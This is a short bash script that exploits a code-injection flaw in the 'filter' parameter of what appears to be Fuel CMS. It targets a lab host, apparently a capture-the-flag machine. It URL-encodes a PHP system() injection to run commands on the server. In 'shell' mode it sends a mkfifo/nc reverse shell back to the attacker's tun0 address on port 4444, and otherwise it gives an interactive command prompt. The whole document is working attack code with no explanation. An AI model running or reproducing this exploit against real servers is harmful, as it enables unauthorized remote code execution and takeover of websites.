#!/bin/bash
#
[ ${1:-aaa} == "shell" ] && {
	ip=$(ifconfig tun0 | grep -Eo "inet [^ ]*" | cut -f2 -d" ")
	payload="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip 4444 >/tmp/f"
	payload=$(echo "$payload" | xxd -p | tr -d '\n' | sed 's/../%\0/g' | sed 's/%0[aA]$//g')
	curl -s "http://10.10.73.239/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27${payload}%27%29%2b%27" | sed '/<div style="border:1px/q' | sed '1s/^system//g'
	exit
}
#
while read -p "payload: "; do 
	payload=$(echo "$REPLY"|xxd -p | tr -d '\n' | sed 's/../%\0/g' | sed 's/%0[aA]$//g')
	curl -s "http://10.10.73.239/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27${payload}%27%29%2b%27" | sed '/<div style="border:1px/q' | sed '1s/^system//g'
done
